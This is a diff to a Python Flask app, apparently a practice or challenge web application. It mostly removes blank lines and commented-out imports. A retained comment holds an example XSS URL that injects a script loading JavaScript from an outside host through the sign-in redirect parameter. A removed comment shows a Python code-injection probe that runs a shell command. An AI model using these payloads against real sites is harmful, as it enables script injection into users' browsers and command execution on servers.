@@ -5,15 +5,12 @@ import datetime
 from . import app
 from .models import User
 from ..main import app as main_app
-
 from ..main import db
-#  from ..main import user_manager, db_adapter
 
 
 # Example Payload
 # http://localhost:4141/user/sign-in?next=/query%22%3E%3Cscript%20src=%22http://v.mewy.pw:9447/js/payload%22%3E%3C/script%3E
-#
-#
+
 @main_app.before_first_request
 def populate():
     with main_app.app_context():
@@ -45,7 +42,6 @@ def populate():
 def home():
     return render_template("home.html")
 
-# __import__('os').popen('ls').read()
 
 @app.route("/query", methods=['GET', 'POST'])
 @login_required
